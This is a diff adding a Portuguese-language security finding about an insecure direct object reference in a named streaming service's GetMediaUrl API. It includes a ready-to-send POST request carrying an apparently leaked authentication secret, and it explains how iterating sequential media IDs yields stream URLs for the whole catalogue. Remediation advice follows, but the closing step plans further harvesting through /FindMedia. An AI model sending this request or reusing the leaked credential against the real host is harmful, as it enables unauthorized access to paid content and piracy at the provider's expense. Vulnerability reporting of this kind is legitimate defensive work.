@@ -1,0 +1,48 @@
+# F-008 GetMediaUrl — IDOR (Acesso a Streaming sem Auth)
+
+Alvo: netmovies-service.ottvs.com.br (API)
+Severidade: ALTA
+Timestamp: 2026-08-20T03:35:00Z
+
+## Reprodução
+```
+POST https://netmovies-service.ottvs.com.br/v1/android/GetMediaUrl
+Content-Type: application/json
+
+{"MediaId":1,"MediaTypeId":1,"AuthenticationTicket":"netmovies@netmovies:a1c2af@#$","Protocol":"HLS"}
+
+Resposta esperada:
+{
+  "Result":0,
+  "Url": "https://asset-01.ottvs.com.br/.../master.m3u8?...",
+  "MediaType": "HLS"
+}
+```
+
+Endpoint retorna URL de streaming (HLS/DASH/SmoothStreaming) sem verificar se o
+usuário tem assinatura ativa ou pagou pelo conteúdo. Basta ter MediaId numérico
+(sequencial) e o secret vazado.
+
+## Interpretação
+IDOR (Insecure Direct Object Reference) no endpoint GetMediaUrl: o MediaId é
+sequencial e o backend não valida se o usuário atual tem direito de acesso
+ao conteúdo. Basta iterar MediaId de 1 a N para obter URLs de streaming de
+TODO o catálogo.
+
+**Novo subdomínio descoberto**: `asset-01.ottvs.com.br` (asset streaming server)
+
+## Impacto
+- **Acesso gratuito a TODO o catálogo** de filmes/séries da NetMovies
+- Download não autorizado de conteúdo protegido por direitos autorais
+- Burla completa do sistema de assinatura/pagamento
+- Possível redistribuição ilegal do conteúdo
+- Perda de receita de assinatura
+
+## Recomendação
+1. **IMEDIATO**: Implementar verificação de entitlements antes de retornar URLs de stream
+2. Validar que o usuário associado ao AuthenticationTicket tem assinatura ativa
+3. Não expor MediaId como inteiro sequencial — usar UUID não-preditível
+4. Implementar token de acesso temporário para URLs de stream (assinado + expiry)
+
+## Próximo passo
+Extrair lista de MediaIds disponíveis via /FindMedia e iterar para obter streams.
